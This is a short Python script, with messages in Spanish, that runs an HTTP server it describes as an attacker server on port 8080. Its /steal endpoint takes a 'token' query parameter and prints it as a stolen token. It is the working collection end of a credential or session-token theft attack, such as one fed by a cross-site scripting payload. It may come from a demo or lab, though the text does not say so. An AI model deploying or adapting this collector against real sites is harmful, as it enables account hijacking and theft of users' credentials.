from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/steal":
            token = parse_qs(parsed.query).get("token", [""])[0]
            print(f"[💀 TOKEN ROBADO] {token}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

print("🔥 Servidor atacante escuchando en http://localhost:8080")
HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
